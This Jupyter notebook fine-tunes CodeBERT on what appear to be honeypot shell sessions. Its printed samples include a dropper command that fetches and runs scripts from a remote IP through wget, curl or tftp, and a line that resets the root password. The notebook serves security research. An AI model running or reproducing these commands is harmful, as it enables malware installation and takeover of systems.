{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4f968c1c",
   "metadata": {
    "tags": []
   },
   "source": [
    "# Domain Adaptation\n",
    "## This notebook performs the domain-adaptation of an existing LM on Unix"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f4bc7cb-048d-4f76-819d-b129155b7057",
   "metadata": {},
   "source": [
    "### N.b. For the domain adaptation step, refer to:\n",
    "#### https://huggingface.co/course/chapter7/3?fw=pt"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6d8d9fe0",
   "metadata": {},
   "source": [
    "### Check if CUDA is available:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "31775ada",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import torch\n",
    "num_devices = torch.cuda.device_count()\n",
    "print(f\"Number of CUDA devices: {num_devices}\")\n",
    "if torch.cuda.is_available():\n",
    "    device = torch.device(\"cuda:0\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c472c26-aa5d-444a-a67a-846e13a5fed0",
   "metadata": {},
   "source": [
    "### Simplify level of alert warnings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b55ff1a2-d171-41fa-bc70-3922c02c4eb8",
   "metadata": {},
   "outputs": [],
   "source": [
    "import warnings\n",
    "import datasets\n",
    "warnings.simplefilter(action='ignore', category=FutureWarning)\n",
    "datasets.utils.logging.set_verbosity(datasets.utils.logging.ERROR)\n",
    "datasets.utils.logging.enable_progress_bar()\n",
    "\n",
    "import transformers\n",
    "transformers.utils.logging.set_verbosity(transformers.utils.logging.ERROR)\n",
    "transformers.utils.logging.enable_progress_bar()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "70e73386",
   "metadata": {
    "tags": []
   },
   "source": [
    "### Import config"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "0de1929d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "with open(\"../config.json\") as f:\n",
    "    config = json.load(f)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bcd43493-0fa8-4b2c-ac37-ab79eec3c40d",
   "metadata": {},
   "source": [
    "### First import the dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "69d9b6aa-9486-4128-98d7-831fb38e689e",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Found cached dataset parquet (/home/det_user/mboffa/.cache/huggingface/datasets/parquet/default-0e91ee06387f12ff/0.0.0/2a3b91fbd88a2c90d1dbbb32b460cf621d31bd5b05b934492fdef7d8d6f236ec)\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bf7c13ff67774b488556a082e894cdbb",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/2 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from datasets import load_dataset\n",
    "INPUT_PATH = \"../Dataset/Training/Self_Supervised/\"\n",
    "\n",
    "data_files = {\"train\": f\"{INPUT_PATH}/training_set.csv\", \"validation\": f\"{INPUT_PATH}/validation_set.csv\"}\n",
    "dataset = load_dataset(\"csv\", data_files=data_files)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "2130492b-888b-457d-b72b-b6a2a0be6506",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "DatasetDict({\n",
       "    train: Dataset({\n",
       "        features: ['sessions'],\n",
       "        num_rows: 15856\n",
       "    })\n",
       "    validation: Dataset({\n",
       "        features: ['sessions'],\n",
       "        num_rows: 3964\n",
       "    })\n",
       "})"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c5ee737c-83be-40de-b76a-ce0b3ca06236",
   "metadata": {},
   "source": [
    "### Create features"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "fbd33fbf-22d0-4c6c-bc44-9fdbf033a678",
   "metadata": {},
   "outputs": [],
   "source": [
    "from datasets import Features, Sequence, Value, ClassLabel\n",
    "features = Features(\n",
    "    {\n",
    "        'sessions': Value(dtype='string', id=None),\n",
    "    }\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "862c79b1-793b-45a3-a371-147643610be2",
   "metadata": {},
   "source": [
    "#### Not useful here but kept for compatibility\n",
    "##### Elements are already strings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "4a1269c3-d6c1-4007-be18-186434521673",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Loading cached processed dataset at /home/det_user/mboffa/.cache/huggingface/datasets/parquet/default-0e91ee06387f12ff/0.0.0/2a3b91fbd88a2c90d1dbbb32b460cf621d31bd5b05b934492fdef7d8d6f236ec/cache-7da0290bc4a902dc.arrow\n",
      "Loading cached processed dataset at /home/det_user/mboffa/.cache/huggingface/datasets/parquet/default-0e91ee06387f12ff/0.0.0/2a3b91fbd88a2c90d1dbbb32b460cf621d31bd5b05b934492fdef7d8d6f236ec/cache-994da2f3d094b102.arrow\n"
     ]
    }
   ],
   "source": [
    "import ast\n",
    "def process(ex):\n",
    "    return {\"sessions\": ex[\"sessions\"]}\n",
    "dataset = dataset.map(process, features=features)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30b6e791",
   "metadata": {},
   "source": [
    "### Import pre-trained tokenizer\n",
    "#### Must be consistent with following model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "8040f6da",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "chosen_tokenizer = \"microsoft/codebert-base\"\n",
    "#Cache so that we don't have to download the same model multiple times\n",
    "cache_folder = f\"./Tokenizer/{chosen_tokenizer}/\"\n",
    "os.makedirs(cache_folder, exist_ok = True)    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1c36a987-781f-468b-b6cf-3affb76640e2",
   "metadata": {},
   "source": [
    "### AutoTokenizer classes are here:\n",
    "\n",
    "https://huggingface.co/docs/transformers/v4.25.1/en/model_doc/auto#transformers.AutoTokenizer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "004f2ff5",
   "metadata": {},
   "outputs": [],
   "source": [
    "from transformers import AutoTokenizer\n",
    "\n",
    "tokenizer = AutoTokenizer.from_pretrained(f'{chosen_tokenizer}', cache_dir=f'{cache_folder}cache') # In case it is already present, do not download it again"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d72e7768-a2fd-474b-a4f9-789fbfaf1dae",
   "metadata": {},
   "source": [
    "### Notice (citing https://huggingface.co/course/chapter7/3?fw=pt)\n",
    "For both auto-regressive and masked language modeling, a common preprocessing step is to concatenate all the examples and then split the whole corpus into chunks of equal size. This is quite different from our usual approach, where we simply tokenize individual examples. Why concatenate everything together? The reason is that individual examples might get truncated if they’re too long, and that would result in losing information that might be useful for the language modeling task!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a523eec9-0c62-4f29-bdd3-f2eb27cb258f",
   "metadata": {},
   "source": [
    "### Define tokenizing function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "924a77b1-9f68-4389-8205-9d25339ade05",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Loading cached processed dataset at /home/det_user/mboffa/.cache/huggingface/datasets/parquet/default-0e91ee06387f12ff/0.0.0/2a3b91fbd88a2c90d1dbbb32b460cf621d31bd5b05b934492fdef7d8d6f236ec/cache-2d601969fe8f2bd8.arrow\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "19b49946c545482b8b3bd84a1d8c3daa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/3964 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Token indices sequence length is longer than the specified maximum sequence length for this model (811 > 512). Running this sequence through the model will result in indexing errors\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "DatasetDict({\n",
       "    train: Dataset({\n",
       "        features: ['input_ids', 'attention_mask', 'word_ids'],\n",
       "        num_rows: 15856\n",
       "    })\n",
       "    validation: Dataset({\n",
       "        features: ['input_ids', 'attention_mask', 'word_ids'],\n",
       "        num_rows: 3964\n",
       "    })\n",
       "})"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def tokenize_function(examples):\n",
    "    result = tokenizer(examples[\"sessions\"])\n",
    "    if tokenizer.is_fast:\n",
    "        result[\"word_ids\"] = [result.word_ids(i) for i in range(len(result[\"input_ids\"]))]\n",
    "    return result\n",
    "\n",
    "# Use batched=True to activate fast multithreading!\n",
    "tokenized_datasets = dataset.map(\n",
    "    tokenize_function, batched=True, remove_columns=[\"sessions\"]\n",
    ")\n",
    "tokenized_datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "042fca54-cd62-40ca-b3ed-5d1321d87576",
   "metadata": {},
   "source": [
    "### Let's visualize an example of how tokenization is performed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "9586662b-a98a-4d61-be74-8d99fe8715d6",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Loading cached shuffled indices for dataset at /home/det_user/mboffa/.cache/huggingface/datasets/parquet/default-0e91ee06387f12ff/0.0.0/2a3b91fbd88a2c90d1dbbb32b460cf621d31bd5b05b934492fdef7d8d6f236ec/cache-93fd2ff7e4f7fc5b.arrow\n"
     ]
    }
   ],
   "source": [
    "sample = dataset[\"train\"].shuffle(seed=42).select(range(1))['sessions']\n",
    "tokenized_sample = tokenizer(sample, add_special_tokens=True, truncation=True, max_length=512)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "1df68113-fe38-4956-bc38-bf69003f44eb",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sample:\n",
      "['uname -s uname -r uname -m uname -p || echo uname -v ; cat /etc/debian_release ; cat /etc/debian_version ; cat /etc/redhat-release ; cat /etc/redhat_version ; cat /etc/os-release ; cat /etc/SuSE-release ; cat /etc/fedora-release ; cat /etc/slackware-release ; cat /etc/slackware-version ; cat /etc/system-release ; cat /etc/mandrake-release ; cat /etc/yellowdog-release ; cat /etc/gentoo-release ; cat /etc/UnitedLinux-release ; cat /etc/vmware-release ; vmware -v ; uname -s uname -r uname -m uname -p || echo uname -v ; cat /etc/debian_release ; cat /etc/debian_version ; cat /etc/redhat-release ; cat /etc/enterprise-release ; cat /etc/fedora-release ; cat /etc/alpine-release ; cat /etc/slackware-release ; cat /etc/euleros-release ; cat /etc/slackware-version ; cat /etc/lsb-release ; cat /etc/system-release ; id ; cat /etc/mandrake-release ; cat /etc/yellowdog-release ; echo ; cat /etc/gentoo-release ; cat /etc/UnitedLinux-release ; echo ; cat /etc/vmware-release ; id ; vmware -v ; show version ;']\n",
      "\n",
      "Tokenized Sample (going to be truncated if > 512):\n",
      "['<s>', 'un', 'ame', 'Ġ-', 's', 'Ġun', 'ame', 'Ġ-', 'r', 'Ġun', 'ame', 'Ġ-', 'm', 'Ġun', 'ame', 'Ġ-', 'p', 'Ġ||', 'Ġecho', 'Ġun', 'ame', 'Ġ-', 'v', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'debian', '_', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'debian', '_', 'version', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'red', 'hat', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'red', 'hat', '_', 'version', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'os', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'Su', 'SE', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'fed', 'ora', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'sl', 'ack', 'ware', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'sl', 'ack', 'ware', '-', 'version', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'system', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'm', 'andra', 'ke', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'yellow', 'dog', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'gent', 'oo', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'United', 'Linux', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'vm', 'ware', '-', 'release', 'Ġ;', 'Ġvm', 'ware', 'Ġ-', 'v', 'Ġ;', 'Ġun', 'ame', 'Ġ-', 's', 'Ġun', 'ame', 'Ġ-', 'r', 'Ġun', 'ame', 'Ġ-', 'm', 'Ġun', 'ame', 'Ġ-', 'p', 'Ġ||', 'Ġecho', 'Ġun', 'ame', 'Ġ-', 'v', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'debian', '_', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'debian', '_', 'version', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'red', 'hat', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'enter', 'prise', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'fed', 'ora', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'al', 'pine', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'sl', 'ack', 'ware', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'e', 'uler', 'os', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'sl', 'ack', 'ware', '-', 'version', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'ls', 'b', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'system', '-', 'release', 'Ġ;', 'Ġid', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'm', 'andra', 'ke', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'yellow', 'dog', '-', 'release', 'Ġ;', 'Ġecho', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'gent', 'oo', '-', 'release', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'United', 'Linux', '-', 'release', 'Ġ;', 'Ġecho', 'Ġ;', 'Ġcat', 'Ġ/', 'etc', '/', 'vm', 'ware', '-', 'release', 'Ġ;', 'Ġid', 'Ġ;', 'Ġvm', 'ware', 'Ġ-', 'v', 'Ġ;', 'Ġshow', 'Ġversion', 'Ġ;', '</s>']\n"
     ]
    }
   ],
   "source": [
    "print(f\"Sample:\\n{sample}\")\n",
    "print(f\"\\nTokenized Sample (going to be truncated if > 512):\\n{tokenized_sample.tokens()}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5ec44bbd-fe14-4a99-9581-d97e1439ac97",
   "metadata": {},
   "source": [
    "### Let's define the fixed size we will feed to our model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "edcf8278-f8f7-4d4f-bf1e-c63893c14385",
   "metadata": {},
   "source": [
    "Note that using a small chunk size can be detrimental in real-world scenarios, so you should use a size that corresponds to the use case you will apply your model to."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "4a1fc75d-bf13-494c-9d44-77860e968536",
   "metadata": {},
   "outputs": [],
   "source": [
    "chunk_size = 256 #max is 512 for the chosen model"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a91e3616-ba5e-447f-a8df-923f46ead66d",
   "metadata": {},
   "source": [
    "### Example to prove mechanism is working"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "74d62f50-d454-48de-9f74-aae0a8b7e48b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'Session 0 length: 132'\n",
      "'Session 1 length: 14'\n",
      "'Session 2 length: 255'\n",
      "'Session 3 length: 15'\n",
      "'Session 4 length: 16'\n"
     ]
    }
   ],
   "source": [
    "# Slicing produces a list of lists for each feature\n",
    "tokenized_samples = tokenized_datasets[\"train\"][:5]\n",
    "\n",
    "for idx, sample in enumerate(tokenized_samples[\"input_ids\"]):\n",
    "    print(f\"'Session {idx} length: {len(sample)}'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "30ff952c-9945-4d6d-8f8c-2029b8d3547e",
   "metadata": {},
   "source": [
    "### Concatenate them"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "07ab18b4-45c3-4bec-94a3-02643d5cb8b6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'Concatenated sessions length: 432'\n"
     ]
    }
   ],
   "source": [
    "concatenated_examples = {\n",
    "    k: sum(tokenized_samples[k], []) for k in tokenized_samples.keys()\n",
    "}\n",
    "total_length = len(concatenated_examples[\"input_ids\"])\n",
    "print(f\"'Concatenated sessions length: {total_length}'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d40d2d33-25dc-45a2-9861-c94dcd0d755f",
   "metadata": {},
   "source": [
    "### Now divide concatenation into chunks and make sure none is bigger than chosen size"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "35ee6ea5-2b0d-4368-b36c-120e59a8e0ef",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "'Chunk length: 256'\n",
      "'Chunk length: 176'\n"
     ]
    }
   ],
   "source": [
    "chunks = {\n",
    "    k: [t[i : i + chunk_size] for i in range(0, total_length, chunk_size)]\n",
    "    for k, t in concatenated_examples.items()\n",
    "}\n",
    "\n",
    "for chunk in chunks[\"input_ids\"]:\n",
    "    print(f\"'Chunk length: {len(chunk)}'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e1eee299-048f-4f0a-80d0-d5c6434b79c9",
   "metadata": {},
   "source": [
    "### Create function that systematically group sessions"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "875568c0-aa8f-448a-b5f5-95918f5d48eb",
   "metadata": {},
   "source": [
    "#### Chunks smaller than chunk_size will be removed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "54ae36bf-6369-48c2-8b16-5f91912cda95",
   "metadata": {},
   "outputs": [],
   "source": [
    "def group_texts(examples):\n",
    "    # Concatenate all texts\n",
    "    concatenated_examples = {k: sum(examples[k], []) for k in examples.keys()}\n",
    "    # Compute length of concatenated texts\n",
    "    total_length = len(concatenated_examples[list(examples.keys())[0]])\n",
    "    # We drop the last chunk if it's smaller than chunk_size\n",
    "    total_length = (total_length // chunk_size) * chunk_size\n",
    "    # Split by chunks of max_len\n",
    "    result = {\n",
    "        k: [t[i : i + chunk_size] for i in range(0, total_length, chunk_size)]\n",
    "        for k, t in concatenated_examples.items()\n",
    "    }\n",
    "    # Create a new labels column\n",
    "    result[\"labels\"] = result[\"input_ids\"].copy()\n",
    "    return result"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0534c1dc-98cf-41a3-ac3e-084d9f00eb11",
   "metadata": {},
   "source": [
    "Note that in the last step of group_texts() we create a new labels column which is a copy of the input_ids one. \n",
    "\n",
    "As we’ll see shortly, that’s because in masked language modeling the objective is to predict randomly masked tokens in the input batch, and by creating a labels column we provide the ground truth for our language model to learn from."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "e5f4ca1d-426c-41a3-8f54-975e0ec47195",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Loading cached processed dataset at /home/det_user/mboffa/.cache/huggingface/datasets/parquet/default-0e91ee06387f12ff/0.0.0/2a3b91fbd88a2c90d1dbbb32b460cf621d31bd5b05b934492fdef7d8d6f236ec/cache-fe65d2302591c878.arrow\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ed03fd33e3ff49d9808352296b26a536",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Map:   0%|          | 0/3964 [00:00<?, ? examples/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/plain": [
       "DatasetDict({\n",
       "    train: Dataset({\n",
       "        features: ['input_ids', 'attention_mask', 'word_ids', 'labels'],\n",
       "        num_rows: 31865\n",
       "    })\n",
       "    validation: Dataset({\n",
       "        features: ['input_ids', 'attention_mask', 'word_ids', 'labels'],\n",
       "        num_rows: 4594\n",
       "    })\n",
       "})"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lm_datasets = tokenized_datasets.map(group_texts, batched=True)\n",
    "lm_datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b4f594fd-7a07-44a8-8fa3-a5432da329bf",
   "metadata": {},
   "source": [
    "### Now create DataCollator"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "c7f010ec-c70a-47ed-a23d-7975f5b243d2",
   "metadata": {},
   "outputs": [],
   "source": [
    "from transformers import DataCollatorForLanguageModeling\n",
    "# Notice: probability of masking in accordance with literature\n",
    "data_collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm_probability=0.15)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ccc01bb8-8ad0-47fc-8e35-9fa35ab85a29",
   "metadata": {},
   "source": [
    "#### An example:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "21d42c76-8cf5-4fe8-8426-17f20ddaff39",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "You're using a RobertaTokenizerFast tokenizer. Please note that with a fast tokenizer, using the `__call__` method is faster than using a method to encode the text followed by a call to the `pad` method to get a padded encoding.\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['echo cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && rm *.sh; wget http://46.246.45.139/bin.sh || curl http://46.246.45.139/curl.sh -o curl.sh || tftp 46.246.45.139 -c get tftp.sh || tftp -r tftp.sh -g 46.246.45.139; chmod +x *.sh; ./bin.sh; ./curl.sh; ./tftp.sh | sh ;']\n",
      "\n",
      "'>>> <s>echo cd responses<mask> || cd /var/run || cd /mnt ||<mask><mask>root || cd / && rm *.sh<mask> wget http://46.246.45.139/bin.sh || curl http://46.246.45<mask>139/curl.sh -o curl.sh || tft<mask> 46.246.45.139 -c get tftp.sh || t<mask>p -r tftp.sh -g 46.246.45.139; chmod + Elim *.sh<mask>./bin.sh;./curl.sh;<mask>tft<mask>.sh | sh ;</s><s>TMP<mask>FILE=\"$(mktemp -t)\"</s><s><mask> /proc/cpuinfo | grep name | wc -<mask> ; Madden root<mask>bDYt2moltyac | chpasswd |<mask> ; echo 321 > /var/tmp<mask>var03522123 ;<mask><mask><mask> /var/tmp/. scratches<mask><mask>123 ; cat /var/tmp/.<mask>03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -<mask> 1 | awk {<mask> $<mask>,$5,$6, Whit7<mask><mask>8,'\n"
     ]
    }
   ],
   "source": [
    "samples = [lm_datasets[\"train\"][i] for i in range(1)]\n",
    "for sample in samples:\n",
    "    _ = sample.pop(\"word_ids\")\n",
    "\n",
    "print(dataset[\"train\"].select(range(1))['sessions'])\n",
    "    \n",
    "for chunk in data_collator(samples)[\"input_ids\"]:\n",
    "    print(f\"\\n'>>> {tokenizer.decode(chunk)}'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8f62ebb3",
   "metadata": {},
   "source": [
    "#### Instantiate a pre-trained model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "35d2cedd",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Some weights of RobertaForMaskedLM were not initialized from the model checkpoint at microsoft/codebert-base and are newly initialized: ['lm_head.layer_norm.bias', 'lm_head.layer_norm.weight', 'lm_head.bias', 'lm_head.dense.weight', 'lm_head.dense.bias']\n",
      "You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.\n"
     ]
    }
   ],
   "source": [
    "from transformers import Trainer, TrainingArguments, AutoModelForMaskedLM\n",
    "chosen_model = \"microsoft/codebert-base\"\n",
    "cache_folder = f\"./Model_folder/{chosen_model}/\" #Same as before\n",
    "os.makedirs(cache_folder, exist_ok = True)    \n",
    "model = AutoModelForMaskedLM.from_pretrained(f'{chosen_model}', cache_dir=f'{cache_folder}cache') # In case it is already present, do not download it again\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7fa36b3b-3842-4982-ab7c-406ecb587d81",
   "metadata": {},
   "source": [
    "### Create trainer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "d66d6904",
   "metadata": {},
   "outputs": [],
   "source": [
    "if len(chosen_model.split(\"/\")) > 1:\n",
    "    chosen_model = chosen_model.split(\"/\")[-1]\n",
    "\n",
    "finetuned_model_folder = f\"./Finetuned_model/{chosen_model}_bash_finetuned/\"\n",
    "os.makedirs(finetuned_model_folder, exist_ok = True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "ca977e27-e892-4e58-8f47-4a6383a62014",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'codebert-base'"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "chosen_model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "71099067",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Using cuda_amp half precision backend\n"
     ]
    }
   ],
   "source": [
    "# To save only best model in training > https://discuss.huggingface.co/t/save-only-best-model-in-trainer/8442/3\n",
    "training_epochs = 5\n",
    "batch_size = 16\n",
    "# Show the training loss with every epoch\n",
    "logging_steps = len(lm_datasets[\"train\"]) // batch_size\n",
    "\n",
    "fp16 = torch.cuda.is_available()\n",
    "\n",
    "training_args = TrainingArguments(\n",
    "    output_dir = f\"{finetuned_model_folder}tokenizer_{tokenizer_choice}_epochs_{training_epochs}_padded_{chunk_size}/\", #The output directory\n",
    "    overwrite_output_dir=True, #overwrite the content of the output directory (do no continue training from cached content)\n",
    "    num_train_epochs=training_epochs, # number of training epochs\n",
    "    per_device_train_batch_size=batch_size, # batch size for training\n",
    "    per_device_eval_batch_size=batch_size, # batch size for evaluation\n",
    "    learning_rate=1e-5,\n",
    "    evaluation_strategy=\"epoch\",\n",
    "    save_strategy= \"epoch\",\n",
    "    save_total_limit = 1,\n",
    "    load_best_model_at_end = True,\n",
    "    fp16 = fp16 # Useful for memory requirements\n",
    "    )\n",
    "\n",
    "trainer = Trainer(\n",
    "    model=model,\n",
    "    args=training_args,\n",
    "    data_collator=data_collator,\n",
    "    train_dataset=lm_datasets[\"train\"],\n",
    "    eval_dataset=lm_datasets[\"validation\"],\n",
    "    tokenizer=tokenizer,\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4bf6a7ac-4446-4349-a863-565561e1fe1b",
   "metadata": {},
   "source": [
    "### Perplexity before:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "b693ac8f-c303-4fc4-99f4-a4fb285d0265",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div>\n",
       "      \n",
       "      <progress value='576' max='288' style='width:300px; height:20px; vertical-align: middle;'></progress>\n",
       "      [288/288 04:55]\n",
       "    </div>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ">>> Perplexity: 42874495.18\n"
     ]
    }
   ],
   "source": [
    "import math\n",
    "eval_results = trainer.evaluate()\n",
    "print(f\">>> Perplexity: {math.exp(eval_results['eval_loss']):.2f}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56b4ddc4",
   "metadata": {},
   "source": [
    "#### Training function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "dcd60d13",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "The following columns in the training set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
